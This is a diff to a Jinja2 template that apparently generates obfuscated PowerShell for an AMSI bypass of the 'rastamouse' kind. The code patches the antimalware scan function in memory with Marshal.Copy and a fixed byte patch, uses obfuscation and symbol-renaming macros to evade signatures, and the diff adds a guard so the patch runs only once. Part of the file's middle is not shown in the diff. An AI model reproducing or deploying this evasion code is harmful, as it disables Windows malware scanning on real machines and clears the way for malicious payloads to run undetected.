@@ -1,5 +1,8 @@
 {% from 'macros.jinja2' import obfuscate with context%}
 
+{# Because rasta mouse is always executed after the powershell-specific bypass to disable the process-specific AMSI, let's check if it already as been executed #}
+try { Get-Variable {{symbol_name("rastamouse")}} -Scope Global | Out-Null } catch {
+${{symbol_name("rastamouse")}} = $True
 {% set winpatch = '''
 using System;
 using System.Runtime.InteropServices;
@@ -30,4 +33,4 @@ ${{symbol_name("nullpointer")}} = 0
 ${{symbol_name("bytes")}} = {{obfuscate("uFcAB4DD")}}
 ${{symbol_name("patch")}} = [System.Convert]::FromBase64String(${{symbol_name("bytes")}})
 [System.Runtime.InteropServices.Marshal]::{{obfuscate("Copy")}}(${{symbol_name("patch")}}, 0, ${{symbol_name("address")}}, 6)
-
+}
